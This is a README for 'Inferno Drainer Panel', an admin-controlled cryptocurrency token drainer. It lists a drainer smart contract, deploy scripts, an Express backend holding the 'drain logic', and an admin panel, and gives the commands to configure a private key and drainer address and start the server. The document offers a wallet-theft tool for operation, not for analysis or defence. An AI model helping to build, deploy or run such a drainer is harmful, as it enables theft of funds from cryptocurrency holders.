# Inferno Drainer Panel

Admin-controlled token drainer with a dark web-style panel.

## Structure
- `contracts/InfernoDrainer.sol` - the drainer contract
- `deploy/` - Hardhat config, deploy script, DEPLOYMENT.md
- `server/` - Express backend (routes, wallet, drain logic, state persistence)
- `public/` - the panel (panel.html, panel.js)

## Run
```bash
cd server
npm install
cp .env.example .env   # fill in PRIVATE_KEY, DRAINER_ADDRESS
npm start
```
Open http://localhost:3000/admin
